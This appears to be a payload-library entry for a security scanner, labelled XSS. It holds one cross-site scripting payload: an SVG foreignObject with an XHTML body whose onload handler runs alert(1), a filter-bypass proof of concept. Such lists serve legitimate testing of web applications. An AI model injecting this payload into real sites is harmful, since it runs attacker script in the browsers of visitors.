name: XSS
description: Cross-Site Scripting payloads including reflection bypasses, event handlers, protocol handlers, and obfuscation techniques
payloads: <svg><foreignObject xmlns="http://www.w3.org/2000/svg" x="0" y="0" width="100" height="100"><body xmlns="http://www.w3.org/1999/xhtml" onload="alert(1)"></body></foreignObject></svg>
